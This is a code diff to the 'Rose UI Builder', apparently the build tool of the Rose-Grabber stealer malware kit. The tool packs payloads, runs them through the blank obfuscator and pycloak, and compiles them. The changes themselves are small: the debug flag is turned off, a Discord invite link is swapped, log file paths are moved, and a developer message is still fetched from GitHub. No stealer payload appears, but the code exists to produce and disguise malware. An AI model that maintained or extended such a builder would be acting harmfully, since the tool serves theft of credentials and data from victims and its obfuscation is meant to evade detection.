@@ -39,7 +39,7 @@ logger = logging.getLogger(__name__)
 __title__ = 'Rose UI Builder'
 __avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/Rose.png'
 __version__ = '2.3'
-__debugm__ = True
+__debugm__ = False
 __icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/roseb.png"
 __devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/ui/msg.txt").text.splitlines()[0].split(" - ")
 
@@ -102,7 +102,7 @@ links = {
     "svn_github": "https://github.com/suvan1911",
     "smth_github": "https://github.com/smthpy",
     "rose_github": "https://github.com/DamagingRose/Rose-Grabber",
-    "rose_discord": "https://discord.gg/sbt9drkvAA"
+    "rose_discord": "https://discord.gg/GvRZxa4S3Y"
 }
 
 logger.critical(f"Rose UI Builder is using version {str(__version__)}")
@@ -294,13 +294,13 @@ def _makebuild(q: Queue, data_builder) -> str:
                 logger.info("Entering obfuscate process")
                 obf1 = f'call {rvenv} && python {blankobf} -o {rosefu} {rosef}'
                 logger.info(obf1)
-                subprocess.call(obf1, shell=True, stdout=open('logs\\obf-blank.txt', 'w'), stderr=subprocess.STDOUT)
+                subprocess.call(obf1, shell=True, stdout=open('obf-blank.txt', 'w'), stderr=subprocess.STDOUT)
                 install = f'call {rvenv} && cd "{pycloak}" && pip install .'
                 logger.info(install)
-                subprocess.call(install, shell=True, stdout=open('logs\\obf-install.txt', 'w'), stderr=subprocess.STDOUT)
+                subprocess.call(install, shell=True, stdout=open('obf-install.txt', 'w'), stderr=subprocess.STDOUT)
                 obf2 = f'call {rvenv} && pycloak -o {rosefub} -d {rosefu}'
                 logger.info(obf2)
-                subprocess.call(obf2, shell=True, stdout=open('logs\\obf-pycloak.txt', 'w', encoding='utf-8', errors='ignore'), stderr=subprocess.STDOUT)
+                subprocess.call(obf2, shell=True, stdout=open('obf-pycloak.txt', 'w', encoding='utf-8', errors='ignore'), stderr=subprocess.STDOUT)
                 os.remove(rosefu)
                 logger.info("Finished obfuscate process")
             except Exception as e:
@@ -411,7 +411,7 @@ def _makebuild(q: Queue, data_builder) -> str:
         try:
             logger.info("Entering python compile process")
             logger.info(f'Python Compile CMD Line: {compile_line}')
-            output_file = "logs\\rosecompile-py.log"
+            output_file = "rosecompile-py.log"
             subprocess.call(
                 compile_line,
                 shell=True,
@@ -669,8 +669,8 @@ def _features():
 def _github():
     with ui.card():
         with ui.row():
-            ui.button("Open Rose Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'logs', 'roselog.log')))
-            ui.button("Open Rose Compile Log (.py)", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'logs', 'rosecompile-py.log')))
+            ui.button("Open Rose Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'roselog.log')))
+            ui.button("Open Rose Compile Log (.py)", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'rosecompile-py.log')))
 
         with ui.column():
             ui.markdown(f"<code>Message from {__devmsg__[0]}: {__devmsg__[1]}</code>")
